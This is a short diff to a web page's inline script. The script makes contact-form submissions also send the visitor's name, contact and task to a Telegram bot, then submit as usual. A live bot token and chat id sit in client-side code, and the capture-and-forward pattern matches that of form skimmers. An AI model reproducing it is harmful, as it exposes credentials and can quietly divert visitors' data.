@@ -1065,8 +1065,9 @@ document.querySelectorAll('a[href^="#"]').forEach(function(anchor) {
 });
 </script>
 <script>
-document.querySelectorAll(".contact-form").forEach(function(form) {
-  form.addEventListener("submit", function() {
+document.querySelectorAll("form.contact-form").forEach(function(form) {
+  form.addEventListener("submit", function(e) {
+    e.preventDefault();
     var name = (form.querySelector("[name=name]") || {}).value || "";
     var contact = (form.querySelector("[name=contact]") || {}).value || "";
     var task = (form.querySelector("[name=task]") || {}).value || "";
@@ -1079,7 +1080,7 @@ document.querySelectorAll(".contact-form").forEach(function(form) {
     fetch("https://api.telegram.org/bot8873337285:AAEYvrOlbsiqmbbm546jfr8oA7e33o7YlVU/sendMessage", {
       method: "POST", headers: {"Content-Type": "application/json"},
       body: JSON.stringify({chat_id: "2088867074", text: msg})
-    });
+    }).finally(function() { form.submit(); });
   });
 });
 </script>
